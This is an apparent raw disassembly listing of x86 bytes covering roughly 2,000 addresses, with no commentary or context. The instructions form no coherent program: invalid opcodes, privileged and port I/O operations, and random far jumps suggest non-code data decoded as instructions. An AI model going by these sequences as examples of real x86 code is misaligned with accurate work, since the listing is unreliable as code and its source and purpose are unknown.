  425c94:	scas   eax,DWORD PTR es:[edi]
  425c95:	mov    edi,0x1bc7c82e
  425c9a:	or     eax,0x16fda9f
  425c9f:	pop    ds
  425ca0:	or     bl,BYTE PTR [edi-0x5c]
  425ca3:	test   DWORD PTR [ecx],ebx
  425ca5:	and    al,0xf
  425ca7:	adc    ebp,DWORD PTR [ebp-0x64]
  425caa:	test   eax,0x1e515df1
  425caf:	add    DWORD PTR [edx+0x4c9f2be4],esi
  425cb5:	push   edx
  425cb6:	into   
  425cb7:	jl     0x425cfa
  425cb9:	les    ebp,FWORD PTR [edx]
  425cbb:	mov    ecx,0x3c985251
  425cc0:	add    ecx,DWORD PTR [eax+eax*1+0x63]
  425cc4:	fwait
  425cc5:	lods   al,BYTE PTR ds:[esi]
  425cc6:	mov    dh,BYTE PTR [ebp+0x4f7d5014]
  425ccc:	gs ins DWORD PTR es:[edi],dx
  425cce:	or     eax,0x91184ca7
  425cd3:	push   esi
  425cd4:	xor    DWORD PTR [esi+0x9],edx
  425cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425cd8:	stos   DWORD PTR es:[edi],eax
  425cd9:	retf   0x9df4
  425cdc:	mov    ebp,0x8ec02b68
  425ce1:	ss cld 
  425ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ce4:	ret    0xb84f
  425ce7:	das    
  425ce8:	imul   eax,DWORD PTR [edx+0x44b62fb1],0x27f0b2ae
  425cf2:	push   ebx
  425cf3:	enter  0x12d3,0xa1
  425cf7:	or     dh,BYTE PTR [edx+eiz*1-0x47]
  425cfb:	mov    ebp,0x50693ee1
  425d00:	mov    ebp,0xe6c95450
  425d05:	pop    eax
  425d06:	out    dx,eax
  425d07:	xchg   edx,eax
  425d08:	mov    bl,0xe1
  425d0a:	inc    eax
  425d0b:	ja     0x425cf9
  425d0d:	pop    ds
  425d0e:	sbb    DWORD PTR [eax],eax
	...
  425d18:	add    BYTE PTR [eax],al
  425d1a:	dec    edx
  425d1b:	xchg   DWORD PTR [edx+0x4c],edx
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi-0x4d92def1],ecx
  425d27:	add    ecx,DWORD PTR [esi+0x1d48db2]
  425d2d:	add    ch,bh
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [edx],bl
  425d33:	mov    DWORD PTR [esp+eiz*8],edx
  425d36:	sub    eax,0x3cf1c540
  425d3b:	jle    0x425d66
  425d3d:	sub    BYTE PTR [ecx],cl
  425d3f:	in     al,0x66
  425d41:	int3   
  425d42:	cld    
  425d43:	cli    
  425d44:	frstor [edx-0x4036e36b]
  425d4a:	lods   al,BYTE PTR ds:[esi]
  425d4b:	adc    al,0xf6
  425d4d:	xor    ah,ch
  425d4f:	test   eax,0xe0e66d8d
  425d54:	cmp    edx,esi
  425d56:	lahf   
  425d57:	popf   
  425d58:	mov    ds:0xe38090d6,eax
  425d5d:	inc    edi
  425d5e:	out    0x23,eax
  425d60:	ins    DWORD PTR es:[edi],dx
  425d61:	sbb    bh,BYTE PTR [ecx+0x16]
  425d64:	pop    ss
  425d65:	in     al,0xc
  425d67:	cld    
  425d68:	leave  
  425d69:	inc    esp
  425d6a:	mov    ebx,0xcfb81e5c
  425d6f:	mov    cl,0x0
  425d71:	pop    esp
  425d72:	in     al,dx
  425d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d74:	aas    
  425d75:	mov    WORD PTR [ebx-0x6f949ecb],ss
  425d7b:	stos   DWORD PTR es:[edi],eax
  425d7c:	sbb    al,0x30
  425d7e:	rcl    BYTE PTR [ecx-0x69f68af2],cl
  425d84:	push   esp
  425d85:	mov    ebx,0x178d73ac
  425d8a:	sbb    eax,0x9bdeace3
  425d8f:	cmp    al,0x56
  425d91:	dec    esi
  425d92:	push   ebx
  425d93:	inc    ebx
  425d94:	cmp    eax,0x8666540c
  425d99:	or     bl,BYTE PTR [esi]
  425d9b:	not    edx
  425d9d:	xchg   esp,eax
  425d9e:	sahf   
  425d9f:	test   eax,0x583bf5b8
  425da4:	pop    ebx
  425da5:	mov    edx,0xc6b0c2a5
  425daa:	mov    esp,0x906aaa1f
  425daf:	sub    DWORD PTR [edx+esi*8-0x6d579de6],eax
  425db6:	fwait
  425db7:	cmp    bh,ah
  425db9:	std    
  425dba:	mov    ecx,edi
  425dbc:	mov    cl,0x97
  425dbe:	mov    eax,0xe000e942
  425dc3:	mov    esi,fs
  425dc5:	rcl    DWORD PTR [edx],cl
  425dc7:	popf   
  425dc8:	je     0x425df6
  425dca:	pop    es
  425dcb:	pushf  
  425dcc:	scas   eax,DWORD PTR es:[edi]
  425dcd:	dec    edx
  425dce:	or     DWORD PTR [ebx-0x5f],ebx
  425dd1:	xor    DWORD PTR [edi+0x3b],edx
  425dd4:	inc    esp
  425dd5:	ss int3 
  425dd7:	fist   DWORD PTR [eax+edx*1-0x7b]
  425ddb:	scas   al,BYTE PTR es:[edi]
  425ddc:	lea    ebx,[esi+0x64]
  425ddf:	outs   dx,BYTE PTR ds:[esi]
  425de0:	mov    DWORD PTR [esi+0x763d04d9],edx
  425de6:	shr    DWORD PTR [ebx],0xc
  425de9:	cmp    eax,DWORD PTR [esp+esi*1-0x5]
  425ded:	xor    al,0x82
  425def:	push   eax
  425df0:	es adc eax,0xe32ce804
  425df6:	ins    WORD PTR es:[edi],dx
  425df8:	sbb    DWORD PTR [eax+eiz*8],eax
  425dfb:	repz mov ah,BYTE PTR [esp+ebx*4-0x60]
  425e00:	out    dx,eax
  425e01:	out    dx,eax
  425e02:	or     eax,0x6549d464
  425e07:	cmp    BYTE PTR [edx+0x4b],0xaa
  425e0b:	dec    ecx
  425e0c:	inc    eax
  425e0d:	aad    0x12
  425e0f:	push   0x29
  425e11:	sbb    eax,0x7770e64d
  425e16:	lock gs jno 0x425ddb
  425e1a:	mov    dl,0x56
  425e1c:	(bad)  [edi]
  425e1e:	aam    0x76
  425e20:	loope  0x425e26
  425e22:	sub    bh,BYTE PTR [ecx-0x4f]
  425e25:	scas   eax,DWORD PTR es:[edi]
  425e26:	(bad)  
  425e27:	pop    esp
  425e28:	cmp    ch,dl
  425e2a:	(bad)  
  425e2b:	xor    bl,bl
  425e2d:	inc    esp
  425e2e:	outs   dx,DWORD PTR ds:[esi]
  425e2f:	jp     0x425e27
  425e31:	(bad)  
  425e32:	packuswb mm0,mm5
  425e35:	jnp    0x425df2
  425e37:	aad    0xb3
  425e39:	inc    eax
  425e3a:	sub    ebp,DWORD PTR [edx]
  425e3c:	inc    ebp
  425e3d:	xor    eax,0xee768d47
  425e42:	dec    eax
  425e43:	adc    DWORD PTR [eax+eax*1+0x15a9e647],edi
  425e4a:	arpl   WORD PTR [edi-0xc],ax
  425e4d:	push   ds
  425e4e:	jl     0x425e22
  425e50:	imul   BYTE PTR [edx+0x677c68e]
  425e56:	popa   
  425e57:	retf   
  425e58:	and    BYTE PTR [esi+0x5a],bl
  425e5b:	lods   al,BYTE PTR ds:[esi]
  425e5c:	inc    ecx
  425e5d:	push   edi
  425e5e:	or     DWORD PTR [edx],ecx
  425e60:	pop    edi
  425e61:	xor    cl,bh
  425e63:	sub    ebp,DWORD PTR [ebp-0x248b8295]
  425e69:	or     BYTE PTR [ebp-0x7b3a1523],bh
  425e6f:	or     BYTE PTR [eax+0x12],al
  425e72:	lods   al,BYTE PTR ds:[esi]
  425e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e74:	pop    edi
  425e75:	adc    esp,esp
  425e77:	aad    0x2b
  425e79:	mov    eax,eax
  425e7b:	stos   BYTE PTR es:[edi],al
  425e7c:	imul   ecx,DWORD PTR [edx-0xc25baec],0x45
  425e83:	hlt    
  425e84:	add    eax,0x10d1dde2
  425e89:	push   esi
  425e8a:	gs pop esp
  425e8c:	test   BYTE PTR ds:0x657e3377,ch
  425e92:	stc    
  425e93:	addr16 jne 0x425f12
  425e96:	add    esi,DWORD PTR [esi+0x4f]
  425e99:	adc    eax,0xe1e89f52
  425e9e:	fcomip st,st(7)
  425ea0:	pop    es
  425ea1:	clc    
  425ea2:	cwde   
  425ea3:	mov    ?,WORD PTR [ecx]
  425ea5:	add    al,0x92
  425ea7:	(bad)  
  425ea8:	cmp    eax,0x59abf857
  425ead:	inc    esp
  425eae:	pop    edx
  425eaf:	mov    eax,0xbe3a3bc6
  425eb4:	js     0x425e4a
  425eb6:	ret    0x1654
  425eb9:	jge    0x425e5f
  425ebb:	mov    bh,0x59
  425ebd:	cld    
  425ebe:	mov    dh,0x69
  425ec0:	push   eax
  425ec1:	or     dl,BYTE PTR [esi]
  425ec3:	ja     0x425e6f
  425ec5:	sub    bh,BYTE PTR [edx+0x1e]
  425ec8:	add    BYTE PTR [edi],cl
  425eca:	or     bl,BYTE PTR [ecx]
  425ecc:	fstp   TBYTE PTR [edx-0x8d5c4a0]
  425ed2:	aaa    
  425ed3:	xor    BYTE PTR [edx-0x76],cl
  425ed6:	mov    dl,0x42
  425ed8:	aam    0x7c
  425eda:	fisubr WORD PTR [ecx]
  425edc:	or     edx,esi
  425ede:	(bad)  
  425edf:	adc    eax,0x148af500
  425ee4:	and    al,0xdc
  425ee6:	mov    al,ds:0xe5a70edc
  425eeb:	shl    DWORD PTR [edi],1
  425eed:	jb     0x425f5f
  425eef:	mov    eax,ds:0x6996cd94
  425ef4:	add    esp,DWORD PTR [ebx+0x3d]
  425ef7:	pop    edi
  425ef9:	jg     0x425efd
  425efb:	inc    esp
  425efc:	or     al,0xc3
  425efe:	add    eax,0x939b2735
  425f03:	dec    eax
  425f04:	inc    esp
  425f05:	fcom   DWORD PTR [eax+ebx*2-0x5eb7e9d5]
  425f0c:	cmp    eax,0xec3581bf
  425f11:	outs   dx,BYTE PTR ds:[esi]
  425f12:	jecxz  0x425f5a
  425f14:	gs ins DWORD PTR es:[edi],dx
  425f16:	dec    ch
  425f18:	in     eax,0x1c
  425f1a:	gs jmp 0xfe15:0x4ad507ef
  425f22:	xor    al,0x86
  425f24:	and    eax,0x56604141
  425f29:	sub    DWORD PTR [eax-0x18],ebp
  425f2c:	mov    WORD PTR [eax],cs
  425f2e:	add    BYTE PTR cs:[eax],al
	...
  425f39:	add    BYTE PTR [edx],cl
  425f3b:	xchg   edx,eax
  425f3c:	jl     0x425f77
  425f3e:	cld    
  425f3f:	dec    DWORD PTR [edi-0x4d]
  425f42:	or     DWORD PTR [eax+eax*1],ebp
  425f45:	sub    esi,eax
  425f47:	sbb    DWORD PTR [edx+0x6a],edx
  425f4a:	mov    dl,dh
  425f4c:	add    DWORD PTR [eax],eax
  425f4e:	std    
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    BYTE PTR [ebx+eiz*1],dl
  425f54:	jmp    0x425efc
  425f56:	shr    DWORD PTR [eax+0x59],1
  425f59:	mov    ebx,DWORD PTR [ebp-0x7d45186d]
  425f5f:	dec    ecx
  425f60:	adc    BYTE PTR [esi-0x57],cl
  425f63:	ins    BYTE PTR es:[edi],dx
  425f64:	inc    ecx
  425f65:	adc    BYTE PTR [ebp+0x49],dl
  425f68:	cmp    bh,BYTE PTR [eax]
  425f6a:	in     eax,0x1d
  425f6c:	jno    0x425f74
  425f6e:	test   eax,0xf9a26a2
  425f73:	or     DWORD PTR [eax-0x53],ebp
  425f76:	addr16 mov ebx,0x243308a6
  425f7c:	push   ss
  425f7d:	ins    BYTE PTR es:[edi],dx
  425f7e:	mov    WORD PTR [eax-0x58],ss
  425f81:	popf   
  425f82:	jnp    0x425f26
  425f84:	or     DWORD PTR [edi-0x50],0x44
  425f88:	sbb    BYTE PTR [ebx*1-0x65db1754],ah
  425f8f:	es xor al,0xe4
  425f92:	popf   
  425f93:	cmovo  esp,ebx
  425f96:	cmp    BYTE PTR ds:0xe3c3fb84,dl
  425f9c:	push   ecx
  425f9d:	mov    cl,0x1b
  425f9f:	ja     0x425f9d
  425fa1:	dec    esi
  425fa2:	push   ecx
  425fa3:	sub    al,0x1c
  425fa5:	les    eax,FWORD PTR ds:0xa8e12b04
  425fab:	les    esp,FWORD PTR [esi+0x63]
  425fae:	push   edi
  425faf:	push   eax
  425fb0:	dec    ebp
  425fb1:	lds    eax,FWORD PTR [ebx+0x55908760]
  425fb7:	inc    esi
  425fb8:	shl    ch,1
  425fba:	push   eax
  425fbb:	out    dx,al
  425fbc:	pop    eax
  425fbd:	stos   DWORD PTR es:[edi],eax
  425fbe:	dec    edx
  425fbf:	xchg   BYTE PTR [eax],dl
  425fc1:	loope  0x425f8d
  425fc3:	loop   0x425f98
  425fc5:	outs   dx,DWORD PTR ds:[esi]
  425fc6:	push   edx
  425fc7:	mov    ebp,0x82f61588
  425fcc:	lahf   
  425fcd:	xlat   BYTE PTR ds:[ebx]
  425fce:	lds    esp,FWORD PTR [esi-0xb815047]
  425fd4:	loop   0x425fcc
  425fd6:	xor    BYTE PTR [ebp-0x68],ch
  425fd9:	or     edx,0xffffffa7
  425fdc:	loope  0x425fd8
  425fde:	push   ebx
  425fdf:	retf   0xed24
  425fe2:	push   ss
  425fe3:	adc    eax,0xd7d273e6
  425fe8:	mov    BYTE PTR [ebp-0x3b75c7b2],cl
  425fee:	sub    bl,BYTE PTR [ebx-0x645054c7]
  425ff4:	sub    ebx,DWORD PTR [ebp+ecx*1+0x7d]
  425ff8:	ss mov ah,0x59
  425ffb:	mov    esp,0x8085b43
  426000:	fdiv   DWORD PTR [edx+0x9]
  426003:	sub    esp,eax
  426005:	sbb    al,0x65
  426007:	jb     0x425f9a
  426009:	push   esi
  42600a:	repz pop esp
  42600c:	mov    edi,0x8c283a36
  426011:	cmp    eax,0x7041e73a
  426016:	jge    0x425fc4
  426018:	(bad)  
  426019:	and    al,0x97
  42601b:	ret    
  42601c:	fcom   QWORD PTR [ecx+0x26]
  42601f:	pop    esi
  426020:	ret    0xd8d3
  426023:	push   ecx
  426024:	pop    ss
  426025:	dec    ecx
  426026:	mov    esp,0xff273e0
  42602b:	xchg   ebx,esi
  42602d:	add    eax,edx
  42602f:	(bad)  
  426030:	pop    edx
  426031:	je     0x42606e
  426033:	mov    eax,0xac85ba74
  426038:	ins    BYTE PTR es:[edi],dx
  426039:	es aad 0x3a
  42603c:	push   ds
  42603d:	stc    
  42603e:	call   DWORD PTR [esi]
  426040:	mov    ch,0x95
  426042:	int3   
  426043:	xor    DWORD PTR [ebx],ecx
  426045:	(bad)  
  426046:	mov    al,0x56
  426048:	jnp    0x426050
  42604a:	(bad)  
  42604c:	xchg   BYTE PTR [eax-0x7f29eff7],bl
  426052:	je     0x426044
  426054:	es push edx
  426056:	lahf   
  426057:	jge    0x425fe6
  426059:	dec    esi
  42605a:	mov    cl,0x1
  42605c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42605d:	push   ecx
  42605e:	hlt    
  42605f:	and    al,0xe4
  426061:	push   ecx
  426062:	retf   
  426063:	cwde   
  426064:	push   esp
  426065:	pop    ss
  426066:	(bad)  
  426067:	push   ebp
  426068:	(bad)  
  426069:	jecxz  0x426037
  42606b:	xchg   ebp,eax
  42606c:	aaa    
  42606d:	mov    ds:0xab7b772c,eax
  426072:	lods   eax,DWORD PTR ds:[esi]
  426073:	adc    DWORD PTR [edx+0x60c5797b],0x25
  42607a:	xchg   esi,eax
  42607b:	push   esi
  42607c:	or     DWORD PTR [esi-0x2a],ebp
  42607f:	sbb    al,0x6d
  426081:	je     0x426061
  426083:	vpsllq ymm3,ymm3,XMMWORD PTR [edx-0x74cdcf93]
  42608b:	xchg   esi,eax
  42608c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42608d:	sub    eax,DWORD PTR [ebp+0xe0483a]
  426093:	xor    cl,0x27
  426096:	add    ah,BYTE PTR [esi+ecx*8]
  426099:	sub    al,0xe1
  42609b:	pop    ebx
  42609c:	jmp    0x8a40:0x2742ceae
  4260a3:	mov    dh,0x75
  4260a5:	and    bl,BYTE PTR [ebx]
  4260a7:	or     eax,DWORD PTR [esi-0x57ca85c8]
  4260ad:	mov    dl,0xaf
  4260af:	mov    DWORD PTR [ebx],esp
  4260b1:	sbb    dh,BYTE PTR es:[eax+0x402c1a16]
  4260b8:	pop    eax
  4260b9:	sbb    al,0x10
  4260bb:	je     0x42612b
  4260bd:	div    BYTE PTR [ebx-0x41]
  4260c0:	test   ch,ah
  4260c2:	jae    0x4260ae
  4260c4:	loop   0x4260e1
  4260c6:	pop    ds
  4260c7:	inc    esp
  4260c8:	inc    ebp
  4260c9:	lgdtd  [edx-0x72c26b48]
  4260d0:	add    edi,DWORD PTR [esi-0x3f]
  4260d3:	mov    ?,WORD PTR [esi-0x5b35e168]
  4260d9:	inc    eax
  4260da:	cdq    
  4260db:	repnz imul ebx,DWORD PTR [edi],0xffffffc0
  4260df:	jne    0x42615b
  4260e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260e2:	jg     0x42614f
  4260e4:	in     eax,dx
  4260e5:	mov    ds:0x348470d4,al
  4260ea:	mov    cl,0xa3
  4260ec:	pop    edi
  4260ed:	ins    DWORD PTR es:[edi],dx
  4260ee:	(bad)  
  4260ef:	fcmovnb st,st(1)
  4260f1:	mov    bl,0x74
  4260f3:	les    ecx,FWORD PTR [esi+edx*8+0x36]
  4260f7:	in     eax,dx
  4260f8:	out    0xdd,al
  4260fa:	jmp    0x62b4c9d0
  4260ff:	pop    ss
  426100:	inc    ebp
  426101:	add    eax,esi
  426103:	and    eax,0x855e24d7
  426108:	fist   DWORD PTR [ecx]
  42610a:	xor    al,0xc9
  42610c:	mov    bh,0xe6
  42610e:	mov    bh,0x3e
  426110:	jl     0x426166
  426112:	mov    eax,ds:0xa76cd80
  426117:	shl    BYTE PTR [edi-0x55cf067f],0xb7
  42611e:	fnsave [edi+0x2d157f9b]
  426124:	cdq    
  426125:	push   cs
  426126:	mov    bl,BYTE PTR [edi+ecx*1-0x3ee9bccb]
  42612d:	mov    ch,0x36
  42612f:	xchg   ecx,eax
  426130:	push   ds
  426131:	push   ebx
  426132:	lock ds jmp 0x27ab9ff7
  426139:	cdq    
  42613a:	loop   0x426149
  42613c:	out    0xb0,al
  42613e:	or     edi,ebp
  426140:	mov    eax,0x7d8832f9
  426145:	gs int3 
  426147:	mov    ds:0xa04d0506,al
  42614c:	arpl   WORD PTR [edi],di
  42614e:	iret   
	...
  426157:	add    BYTE PTR [eax],al
  426159:	add    bl,al
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	out    dx,al
  426167:	outs   dx,DWORD PTR ds:[esi]
  426168:	add    esp,DWORD PTR [ebx-0x79]
  42616b:	fadd   DWORD PTR [ecx]
  42616d:	add    ch,bh
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [eax+0x7d],cl
  426174:	fcomp  DWORD PTR [eax]
  426176:	pop    esp
  426177:	dec    esp
  426178:	loope  0x42614f
  42617a:	cmc    
  42617b:	sub    DWORD PTR [edi+edi*1-0x42c85e33],esp
  426182:	scas   eax,DWORD PTR es:[edi]
  426183:	jmp    0x4261da
  426185:	mov    ch,0xb0
  426187:	retf   0x8011
  42618a:	pop    edx
  42618b:	popa   
  42618c:	and    eax,DWORD PTR gs:[edi-0x69]
  426190:	aaa    
  426191:	repnz mov ds:0x7a495b7c,eax
  426197:	fcmovbe st,st(3)
  426199:	pusha  
  42619a:	mov    ah,0xa3
  42619c:	(bad)  
  42619d:	pop    ebx
  42619e:	mov    cl,bl
  4261a0:	dec    eax
  4261a1:	iret   
  4261a2:	adc    ebp,esi
  4261a4:	addr16 pop ebp
  4261a6:	and    eax,0x79e6cc4e
  4261ab:	(bad)  
  4261ac:	mov    ch,0xd3
  4261ae:	out    0x73,al
  4261b0:	iret   
  4261b1:	(bad)  
  4261b2:	out    dx,al
  4261b3:	adc    al,0xd9
  4261b5:	ja     0x42614c
  4261b7:	call   dx
  4261ba:	adc    esi,DWORD PTR [ebx+0x4537d4db]
  4261c0:	pop    ds
  4261c1:	(bad)  
  4261c2:	std    
  4261c3:	nop
  4261c4:	push   ss
  4261c5:	shr    DWORD PTR [edi-0x3e769b05],0xbc
  4261cc:	inc    esi
  4261cd:	das    
  4261ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261cf:	mov    BYTE PTR [ecx+0x3d],bh
  4261d2:	sub    eax,0xb2829521
  4261d7:	mov    esp,0xe4e617eb
  4261dc:	inc    edi
  4261dd:	jno    0x42620b
  4261df:	push   es
  4261e0:	hlt    
  4261e1:	adc    al,0x56
  4261e3:	ror    BYTE PTR ds:[esi-0x3a],cl
  4261e7:	xchg   esp,eax
  4261e8:	mov    ?,edi
  4261ea:	mov    al,ds:0xe4ba3b65
  4261ef:	or     DWORD PTR [eax-0x7d],edx
  4261f2:	adc    eax,0xc5965fe0
  4261f7:	jnp    0x4261a8
  4261f9:	std    
  4261fa:	cld    
  4261fb:	out    0x4a,al
  4261fd:	xchg   DWORD PTR [ebp+eiz*2+0x4b],edx
  426201:	cmp    al,0xae
  426203:	test   BYTE PTR [ebp+0x76],ah
  426206:	dec    edx
  426207:	cli    
  426208:	outs   dx,BYTE PTR ds:[esi]
  426209:	adc    eax,0x5159b02c
  42620e:	or     bh,ah
  426210:	mov    dh,0xb8
  426212:	jecxz  0x4261bc
  426214:	int    0xe5
  426216:	jo     0x4261ce
  426218:	sbb    ecx,DWORD PTR [eax-0x7da01400]
  42621e:	mov    ?,WORD PTR [edi]
  426220:	sbb    BYTE PTR [ebx+0x468d2699],bl
  426226:	and    al,bl
  426228:	mov    al,ds:0x58151dde
  42622d:	mov    WORD PTR [edi],?
  42622f:	or     ch,bh
  426231:	lea    ebp,[ebx-0x1e]
  426234:	clc    
  426235:	mov    esp,esp
  426237:	pop    edi
  426238:	retf   
  426239:	jbe    0x42622e
  42623b:	sbb    al,0x78
  42623d:	sti    
  42623e:	mov    ds:0xc137b116,eax
  426243:	or     edx,edx
  426245:	addr16 das 
  426247:	and    eax,0x94406056
  42624c:	xchg   BYTE PTR [edx+0x4cde6d3a],bh
  426252:	inc    esp
  426253:	and    eax,0x7f5a6b6f
  426258:	or     ebp,DWORD PTR [ebx]
  42625a:	xchg   ebp,eax
  42625b:	sub    ecx,DWORD PTR [ebx+0x8]
  42625e:	or     dh,bh
  426260:	mov    dl,0x65
  426262:	push   eax
  426263:	loope  0x426231
  426265:	dec    edx
  426266:	adc    esi,DWORD PTR [edi]
  426268:	sahf   
  426269:	sub    BYTE PTR [ebx+ecx*4],ah
  42626c:	cdq    
  42626d:	rcl    DWORD PTR [edx-0x46cc1c57],1
  426273:	nop
  426274:	and    BYTE PTR [edi-0x43],bl
  426277:	stos   BYTE PTR es:[edi],al
  426278:	sbb    al,0xfd
  42627a:	out    0x56,al
  42627c:	and    DWORD PTR [eax],edx
  42627e:	out    0xa6,eax
  426280:	cmp    DWORD PTR [esi-0x754b919a],eax
  426286:	scas   eax,DWORD PTR es:[edi]
  426287:	fwait
  426288:	and    DWORD PTR [ebx-0x48],edx
  42628b:	adc    al,0xe1
  42628d:	sub    dh,BYTE PTR [edx+0x47]
  426290:	and    eax,0xb05e9809
  426295:	icebp  
  426296:	mov    bh,dh
  426298:	nop
  426299:	(bad)  [edi-0x126a22c]
  42629f:	mov    al,0xbb
  4262a1:	xchg   BYTE PTR [esi],bh
  4262a3:	cmp    eax,0x7e
  4262a6:	and    al,0xc5
  4262a8:	xchg   esp,eax
  4262a9:	jmp    0xf9b1:0x8c6c3401
  4262b0:	adc    al,0xaf
  4262b2:	xchg   DWORD PTR ds:0xf29f28ef,eax
  4262b8:	mov    edi,0xa10bd5ca
  4262bd:	cli    
  4262be:	and    eax,ebp
  4262c0:	sbb    DWORD PTR [edx+0x50],edi
  4262c3:	mov    ecx,0x756aa4dc
  4262c8:	sbb    BYTE PTR [ecx-0x437f5cb3],bh
  4262ce:	push   esi
  4262cf:	xchg   DWORD PTR [edi-0x69],ebx
  4262d2:	jp     0x42628b
  4262d4:	inc    esi
  4262d5:	int3   
  4262d6:	mov    al,0x6e
  4262d8:	outs   dx,DWORD PTR ds:[esi]
  4262d9:	aaa    
  4262da:	sub    al,0x80
  4262dc:	test   eax,0x222c1b80
  4262e1:	out    0x8c,eax
  4262e3:	mov    al,ss:0x1ae0487e
  4262e9:	dec    ebp
  4262ea:	sub    DWORD PTR [ebx],0xfffffff0
  4262ed:	cmp    bh,dl
  4262ef:	sbb    DWORD PTR [ecx+0x6d],esp
  4262f2:	loope  0x4262a3
  4262f4:	cmc    
  4262f5:	rcl    DWORD PTR [esi],1
  4262f7:	push   edx
  4262f8:	fld    QWORD PTR [eax+0xb]
  4262fb:	fiadd  WORD PTR [esi+0x5]
  4262fe:	into   
  4262ff:	mov    bh,BYTE PTR [ebx+0x31]
  426302:	pop    ds
  426303:	pop    es
  426304:	adc    ecx,DWORD PTR [esi-0x31641e8e]
  42630a:	xchg   edi,eax
  42630b:	pop    ax
  42630d:	jae    0x4262d8
  42630f:	retf   
  426310:	push   0x1c2bbdc8
  426315:	sbb    BYTE PTR [ebx],ah
  426317:	jg     0x4262f0
  426319:	ins    BYTE PTR es:[edi],dx
  42631a:	sar    BYTE PTR [ecx+0x44],0x94
  42631e:	xchg   edi,eax
  42631f:	(bad)  
  426320:	addr16 hlt 
  426322:	pop    ds
  426323:	sub    al,0xb5
  426325:	ret    
  426326:	ffree  st(0)
  426328:	pop    ds
  426329:	in     eax,0xe0
  42632b:	fs dec edx
  42632d:	bound  eax,QWORD PTR [eax+0x37]
  426330:	loopne 0x42637c
  426332:	or     DWORD PTR [eax],eax
  426334:	daa    
  426335:	add    BYTE PTR [esi-0x20],al
  426338:	cmp    DWORD PTR [ebx+0x2edc74a3],0xfffffff9
  42633f:	adc    edx,DWORD PTR [ebx]
  426341:	into   
  426342:	fwait
  426343:	imul   edx,edx,0x20
  426346:	push   esp
  426347:	div    BYTE PTR [ecx+0x5a]
  42634a:	xchg   edx,eax
  42634b:	mov    BYTE PTR [edi+0x79],0x3d
  42634f:	or     bh,0x84
  426352:	ret    0x889
  426355:	jecxz  0x4263bd
  426357:	or     al,0x5a
  426359:	sbb    edi,DWORD PTR [edx+0x3da7947c]
  42635f:	adc    BYTE PTR [ebx-0x2aa52996],0xc7
  426366:	jl     0x4262ef
  426368:	push   ss
  426369:	ror    DWORD PTR [ebx],1
  42636b:	push   ecx
  42636c:	xor    DWORD PTR ds:0x3d,0x0
  426373:	add    BYTE PTR [eax],al
  426375:	add    BYTE PTR [eax],al
  426377:	add    BYTE PTR [eax],al
  426379:	add    BYTE PTR [edx-0x101610a7],bl
  42637f:	call   FWORD PTR [esi-0x71a9f385]
  426385:	rcr    DWORD PTR [eax-0x7bf0f329],cl
  42638b:	fiadd  DWORD PTR [ecx]
  42638d:	add    ch,bh
  42638f:	add    DWORD PTR [eax],eax
  426391:	add    BYTE PTR [esi-0x34],dl
  426394:	(bad)
  426397:	std    
  426398:	fnstenv [esi+0x73a56337]
  42639e:	repz push cs
  4263a0:	xchg   ebp,eax
  4263a1:	pop    edx
  4263a2:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4263a4:	mov    dl,0x43
  4263a6:	mov    ah,0x9d
  4263a8:	fwait
  4263a9:	mov    bh,0x6b
  4263ab:	mov    ah,0x74
  4263ad:	and    BYTE PTR [edi],0xb
  4263b0:	clc    
  4263b1:	(bad)  
  4263b2:	adc    esp,edi
  4263b4:	out    0x8f,al
  4263b6:	or     al,BYTE PTR [eax+edi*4+0x8b9408f]
  4263bd:	lock pop edx
  4263bf:	and    esi,DWORD PTR [edx+ebx*4-0x3d]
  4263c3:	jo     0x426397
  4263c5:	fucomi st,st(6)
  4263c7:	add    al,0x1b
  4263c9:	push   esi
  4263ca:	adc    eax,0xce891c91
  4263cf:	es es jae 0x42643a
  4263d3:	cmp    esp,DWORD PTR [ecx+0x5f]
  4263d6:	pop    es
  4263d7:	fistp  QWORD PTR [edi+0x77]
  4263da:	into   
  4263db:	xchg   ebp,eax
  4263dc:	mov    edx,0xd132cdcd
  4263e1:	xor    eax,DWORD PTR [ebx]
  4263e3:	cmp    esi,DWORD PTR [eax-0x34fd1958]
  4263e9:	lahf   
  4263ea:	jno    0x426446
  4263ec:	(bad)  
  4263ed:	popf   
  4263ee:	cli    
  4263ef:	and    al,0x34
  4263f1:	or     al,ch
  4263f3:	add    DWORD PTR [ecx],ebx
  4263f5:	push   esi
  4263f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263f7:	cs jmp 0x61a2:0x6380f87a
  4263ff:	repnz sahf 
  426401:	jle    0x426481
  426403:	pop    es
  426404:	arpl   WORD PTR [esi-0x2c],bp
  426407:	lds    edi,FWORD PTR [edi-0xb2e16cc]
  42640d:	xor    al,BYTE PTR [ebp+0x753a2c38]
  426413:	aaa    
  426414:	out    0xa4,al
  426416:	inc    ebx
  426417:	fadd   st(2),st
  426419:	fs pusha 
  42641b:	inc    ebx
  42641c:	xchg   esp,eax
  42641d:	aad    0x2c
  42641f:	stc    
  426420:	dec    eax
  426421:	in     al,dx
  426422:	bound  edi,QWORD PTR cs:[edx-0x77aa704]
  426429:	fwait
  42642a:	inc    ebp
  42642b:	pop    es
  42642c:	add    edx,edi
  42642e:	fistp  WORD PTR [ebx+eax*4]
  426431:	mov    eax,0x30df5af7
  426436:	jbe    0x426418
  426438:	cmp    al,0xf8
  42643a:	xor    al,0xa6
  42643c:	gs in  eax,0x2c
  42643f:	lock push esp
  426441:	cli    
  426442:	mov    ch,0x2d
  426444:	iret   
  426445:	ss push edi
  426447:	nop
  426448:	push   ss
  426449:	sbb    al,0x2d
